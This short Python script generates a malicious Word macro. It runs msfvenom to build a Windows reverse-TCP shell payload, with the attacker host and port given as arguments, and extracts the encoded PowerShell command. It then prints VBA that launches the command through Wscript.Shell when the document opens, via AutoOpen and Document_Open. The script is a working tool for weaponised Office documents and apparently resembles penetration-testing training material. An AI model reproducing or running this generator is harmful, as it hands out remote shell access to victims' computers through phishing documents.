import subprocess
import sys


venom = "msfvenom --payload windows/shell_reverse_tcp -f hta-psh LHOST={} LPORT={}".format(sys.argv[1],sys.argv[2])
print(venom)

proc = subprocess.Popen(venom.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
o, e = proc.communicate()

for l in o.split(b'\n'):
	if b"powershell.exe -nop" in l:
		sploit = l.split(b'"')[1]
n = 50

print("Sub AutoOpen()")
print("MyMacro")
print("End Sub")
print("Sub Document_Open()")
print("MyMacro")
print("End Sub")
print("Sub MyMacro()")
print("Dim Str As String")
print('Str = "' + sploit[0:n].decode('ascii') + '"')
for i in range(n, len(sploit), n):
	print('Str = Str + "' + sploit[i:i+n].decode('ascii') + '"')
print("CreateObject(\"Wscript.Shell\").Run Str")
print("End Sub")

